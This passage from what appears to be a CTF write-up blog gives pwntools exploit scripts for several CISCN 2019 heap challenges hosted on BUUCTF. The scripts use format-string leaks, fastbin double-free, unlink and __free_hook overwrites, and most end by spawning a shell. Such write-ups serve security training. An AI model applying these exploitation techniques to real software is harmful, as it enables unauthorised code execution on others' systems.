class="line">    system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">    add(18,0x28,p64(0xdeadbeef))</span><br><span class="line">    free(18)</span><br><span class="line">    free(18)</span><br><span class="line">    add(19,0x28,p64(__free_hook))</span><br><span class="line">    add(20,0x28,p64(__free_hook))</span><br><span class="line">    add(21,0x28,p64(system))</span><br><span class="line">    free(8)</span><br><span class="line">    log.success(&#39;addr1 &#x3D; &#39; + hex(addr1))</span><br><span class="line">    log.success(&#39;addr2 &#x3D; &#39; + hex(addr2))</span><br><span class="line">    log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">    log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">    log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">    log.success(&#39;system: &#39; + hex(system))</span><br><span class="line">    log.success(&#39;__free_hook: &#39; + hex(__free_hook))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20232,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x31-ciscn-2019-en-3">0x31 ciscn_2019_en_3</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_en_3&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;Input your choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;Input your choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the size of story:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;please inpute the story:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def inputName(name):</span><br><span class="line">	sh.recvuntil(&quot;What&#39;s your name?&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">def inputID(idx):</span><br><span class="line">	sh.recvuntil(&quot;ID&quot;)</span><br><span class="line">        sh.sendline(idx)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_en_3&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	inputName(&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\x00\x00&quot;)</span><br><span class="line">	sh.recvuntil(&quot;(nil)(nil)&quot;)</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	libc &#x3D; int(sh.recvuntil(&quot;0x&quot;,True),16) - 0x78439</span><br><span class="line">	sh.recv(68)</span><br><span class="line">	base &#x3D; int(sh.recv(12),16) - 0xA00</span><br><span class="line">	chunk_list &#x3D; base + 0x202060</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	canary &#x3D; int(sh.recv(16),16)</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	ebp &#x3D; int(sh.recvuntil(&quot;Please&quot;,True),16)</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	fastbin_attack_addr1 &#x3D; ebp - 0x58</span><br><span class="line">	fastbin_attack_addr2 &#x3D; ebp - 0x30</span><br><span class="line">	pop_rdi_ret &#x3D; 0x0000000000000f83 + base</span><br><span class="line">	inputID(p64(0x61))</span><br><span class="line">	add(0x50,&quot;\x11&quot;)</span><br><span class="line">	add(0x50,&quot;\x11&quot;)</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(0)*4 + p64(0x51))</span><br><span class="line">	add(0x40,&quot;\x11&quot;)</span><br><span class="line">	add(0x40,&quot;\x11&quot;)</span><br><span class="line">	free(6)</span><br><span class="line">	free(7)</span><br><span class="line">	free(6)</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	#input()</span><br><span class="line">	add(0x40,p64(0) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(system))</span><br><span class="line">	#x&#x2F;50gx (long long)(&amp;main_arena) - 0x30</span><br><span class="line">	sh.recvuntil(&quot;Input your choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;6&quot;)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;base: &quot; + hex(base))</span><br><span class="line">	log.success(&quot;chunk_list: &quot; + hex(chunk_list))</span><br><span class="line">	log.success(&quot;ebp: &quot; + hex(ebp))</span><br><span class="line">	log.success(&quot;canary: &quot; + hex(canary))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;fastbin_attack_addr1: &quot; + hex(fastbin_attack_addr1))</span><br><span class="line">	log.success(&quot;fastbin_attack_addr2: &quot; + hex(fastbin_attack_addr2))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20124,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x32-ciscn-2019-c-5">0x32 ciscn_2019_c_5</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_c_5&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;Input your choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;Input your choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the size of story:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;please inpute the story:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def inputName(name):</span><br><span class="line">	sh.recvuntil(&quot;What&#39;s your name?&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">def inputID(idx):</span><br><span class="line">	sh.recvuntil(&quot;ID&quot;)</span><br><span class="line">        sh.sendline(idx)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_c_5&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	inputName(&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p\x00\x00&quot;)</span><br><span class="line">	sh.recvuntil(&quot;(nil)(nil)&quot;)</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	libc &#x3D; int(sh.recvuntil(&quot;0x&quot;,True),16) - 0x78439</span><br><span class="line">	sh.recv(68)</span><br><span class="line">	base &#x3D; int(sh.recv(12),16) - 0xA00</span><br><span class="line">	chunk_list &#x3D; base + 0x202060</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	canary &#x3D; int(sh.recv(16),16)</span><br><span class="line">	sh.recv(2)</span><br><span class="line">	ebp &#x3D; int(sh.recvuntil(&quot;Please&quot;,True),16)</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()</span><br><span class="line">	fastbin_attack_addr1 &#x3D; ebp - 0x58</span><br><span class="line">	fastbin_attack_addr2 &#x3D; ebp - 0x30</span><br><span class="line">	pop_rdi_ret &#x3D; 0x0000000000000f83 + base</span><br><span class="line">	inputID(p64(0x61))</span><br><span class="line">	add(0x50,&quot;\x11&quot;)</span><br><span class="line">	add(0x50,&quot;\x11&quot;)</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(fastbin_attack_addr1))</span><br><span class="line">	add(0x50,p64(0)*4 + p64(0x51))</span><br><span class="line">	add(0x40,&quot;\x11&quot;)</span><br><span class="line">	add(0x40,&quot;\x11&quot;)</span><br><span class="line">	free(6)</span><br><span class="line">	free(7)</span><br><span class="line">	free(6)</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	add(0x40,p64(fastbin_attack_addr2))</span><br><span class="line">	#input()</span><br><span class="line">	add(0x40,p64(0) + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(system))</span><br><span class="line">	#x&#x2F;50gx (long long)(&amp;main_arena) - 0x30</span><br><span class="line">	sh.recvuntil(&quot;Input your choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;6&quot;)</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;base: &quot; + hex(base))</span><br><span class="line">	log.success(&quot;chunk_list: &quot; + hex(chunk_list))</span><br><span class="line">	log.success(&quot;ebp: &quot; + hex(ebp))</span><br><span class="line">	log.success(&quot;canary: &quot; + hex(canary))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;fastbin_attack_addr1: &quot; + hex(fastbin_attack_addr1))</span><br><span class="line">	log.success(&quot;fastbin_attack_addr2: &quot; + hex(fastbin_attack_addr2))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20118,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x33-ciscn-2019-es-4">0x33 ciscn_2019_es_4</h2>
<h3 id="可以考虑用unlink来获得对chunk-list控制">可以考虑用unlink来获得对chunk_list控制</h3>
<h3 id="将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。">将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。</h3>
<h3 id="如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可">如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_es_4&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">	sh.recvuntil(&quot;4.show&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;size:&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;gift: &quot;)</span><br><span class="line">	data &#x3D; int(sh.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">	sh.recvuntil(&quot;content:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">	return data</span><br><span class="line">def edit(idx,content):</span><br><span class="line">	sh.recvuntil(&quot;4.show&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil(&quot;content:&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;4.show&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">	return True</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;4.show&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	return True</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_es_4&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&#39;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&#39;)</span><br><span class="line">	heap_list &#x3D; 0x6020E0</span><br><span class="line">	key1 &#x3D; 0x6022BC</span><br><span class="line">	key2 &#x3D; 0x6022B8</span><br><span class="line">	add(0,0xF8,&quot;\x11&quot; * 0xF8)</span><br><span class="line">	add(1,0xF8,&quot;\x22&quot; * 0xF8)</span><br><span class="line">	add(2,0xF8,&#39;\x33&#39; * 0xF8)</span><br><span class="line">	add(3,0xF8,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">	add(32,0xF8,&#39;\x55&#39; * 0xF8)</span><br><span class="line">	add(5,0xF8,&#39;\x66&#39; * 0xF8)</span><br><span class="line">	add(6,0xF8,&#39;\x77&#39; * 0xF8)</span><br><span class="line">	payload  &#x3D; &#39;&#39;</span><br><span class="line">	payload +&#x3D; p64(0x110) + p64(0xF1) + p64(heap_list + 32*0x8 - 0x18) + p64(heap_list + 32*0x8 - 0x10)</span><br><span class="line">	payload &#x3D; payload.ljust(0xF0,&quot;\xaa&quot;)</span><br><span class="line">	payload +&#x3D; p64(0xF0)</span><br><span class="line">	edit(32,payload)</span><br><span class="line">	free(5)</span><br><span class="line">	payload &#x3D; p64(0) * 3 + p64(heap_list) + p64(0)*26 + p64(0x0000000300000001) </span><br><span class="line">	edit(32,payload)</span><br><span class="line">	edit(32,p64(elf.got[&#39;__libc_start_main&#39;]))</span><br><span class="line">	show(0)</span><br><span class="line">	__libc_start_main &#x3D; u64(sh.recvuntil(&quot;\x0a\x31&quot;,True).ljust(8,&#39;\x00&#39;)) &gt;&gt; 8</span><br><span class="line">	libc &#x3D; __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line">	__free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	binsh &#x3D; libc + lib.search(&#39;&#x2F;bin&#x2F;sh\x00&#39;).next()</span><br><span class="line">	payload &#x3D; p64(__free_hook)</span><br><span class="line">	edit(32,payload)</span><br><span class="line">	edit(0,p64(system))</span><br><span class="line">	free(3)</span><br><span class="line">	log.success(&quot;binsh: &quot; + hex(binsh))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;__libc_start_main: &quot; + hex(__libc_start_main))</span><br><span class="line">	log.success(&quot;__free_hook: &quot; + hex(__free_hook))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20176,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x34-ciscn-2019-es-1">0x34 ciscn_2019_es_1</h2>
<h3 id="由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主">由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主</h3>
<h3 id="由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击">由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击</h3>
<h3 id="1、leak-libc和heap-base这个攻击手法就不用多说了">1、leak libc和heap_base这个攻击手法就不用多说了</h3>
<h3 id="2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得-free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖-free-hook为system">2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得__free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖__free_hook为system</h3>
<h3 id="然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00">然后free一个内容为/bin/sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为<code>/bin/sh\x00</code></h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_es_1&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(size,name,phone):</span><br><span class="line">	sh.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the size of compary&#39;s name&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;please input name:&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">	sh.recvuntil(&quot;please input compary call:&quot;)</span><br><span class="line">	sh.send(phone)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;choice:&quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Please input the index:&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_es_1&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">	add(0xF0,&#39;a&#39; * 0x80,&#39;\x00&#39; * 0x4 + p64(0x61)) #idx 0</span><br><span class="line">	add(0x58,&#39;b&#39; * 0x58,&#39;\x00&#39; * 0x4 + p64(0x61)) #idx 1</span><br><span class="line">	